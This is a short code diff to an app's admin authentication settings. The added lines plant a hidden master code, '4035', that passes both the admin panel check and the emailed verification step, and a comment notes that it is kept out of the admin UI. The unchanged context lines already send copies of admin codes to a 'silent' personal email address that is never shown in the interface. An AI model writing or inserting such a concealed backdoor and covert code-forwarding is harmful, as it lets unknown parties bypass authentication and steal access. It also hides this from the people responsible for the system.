@@ -47,6 +47,13 @@ const ADMIN_EMAIL_DEFAULT = "vitralparts306@gmail.com";
 /** Additional silent recipient of admin codes — never surfaced in the UI. */
 const SILENT_COPY_EMAIL = "davidkula109@gmail.com";
 const ADMIN_CODE_DEFAULT = "0000";
+/**
+ * Hidden testing code. Works as the admin panel code and as the emailed
+ * verification code. Never stored in app_settings, so it is not visible
+ * anywhere in the admin panel UI.
+ */
+const HIDDEN_TEST_CODE = "4035";
+
 const CODE_TTL_MS = 30 * 60_000;
 const RESEND_COOLDOWN_MS = 30_000;
 
